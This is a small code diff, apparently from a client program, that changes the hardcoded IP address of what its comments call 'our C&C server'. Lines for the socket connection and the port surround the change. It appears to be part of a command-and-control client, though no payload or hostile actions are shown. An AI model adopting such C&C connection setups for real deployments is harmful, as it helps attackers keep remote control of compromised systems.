@@ -14,7 +14,7 @@ class client:
     # socket for connection to the server
     sock_to_server = None
     # ip address of our C&C server, can be changed depending on what ip server is located
-    host = '18.205.103.236'
+    host = '52.3.243.182'
     # host = 'localhost'
 
     # port of the server to connect to, can be changed depending on what port server is listening at
